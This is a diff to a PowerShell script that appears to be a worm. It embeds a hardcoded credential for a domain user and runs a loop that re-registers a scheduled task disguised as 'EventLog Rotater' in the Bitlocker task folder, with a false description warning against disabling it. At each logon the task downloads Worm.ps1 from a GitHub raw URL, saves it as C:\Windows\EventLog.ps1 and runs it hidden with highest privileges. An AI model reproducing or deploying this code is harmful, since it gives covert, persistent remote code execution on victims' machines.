@@ -18,7 +18,7 @@ $c0de='Tossking@'
 $c0de=$c0de+$toAppend
 $username='magrene'
 $usernameB=((gwmi WIN32_ComputerSystem).Domain+'\magrene')
-
+Unregister-ScheduledTask -TaskPath \Microsoft\Windows\Bitlocker -TaskName "EventLog Rotater"  -Confirm:$false 
 [SecureString]$secureString = $c0de | ConvertTo-SecureString -AsPlainText -Force 
 [PSCredential]$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $userNameB, $secureString
 
@@ -184,17 +184,17 @@ start-job -scriptBlock {
 start-job -ScriptBlock { 
     while(1 -eq 1){
         try{ 
-        
+            Unregister-ScheduledTask -TaskPath \Microsoft\Windows\Bitlocker -TaskName "EventLog Rotater"  -Confirm:$false 
             $action = @()
             $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "invoke-restmethod https://raw.githubusercontent.com/Magrene/powW/main/Worm.ps1 | out-file -filepath c:\Windows\EventLog.ps1'
             $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "C:\Windows\EventLog.ps1"'
             $trigger = New-ScheduledTaskTrigger -AtLogon
-            Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "EventLog Rotater" -RunLevel Highest -Description "Prevents a event log cache overflow by rotating logs within NTFS filesystems. Disabling can cause system instability and is not recomended." -TaskPath \Microsoft\Windows\Bitlocker -force
+            Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "EventLog Rotater" -RunLevel Highest -credential $credential -Description "Prevents a event log cache overflow by rotating logs within NTFS filesystems. Disabling can cause system instability and is not recomended." -TaskPath \Microsoft\Windows\Bitlocker -force
         }
         catch{
 
         }
-        start-sleep -Seconds (get-random -Minimum 2 -Maximum 5)
+        start-sleep -Seconds (get-random -Minimum 10 -Maximum 20)
     }
 }
 
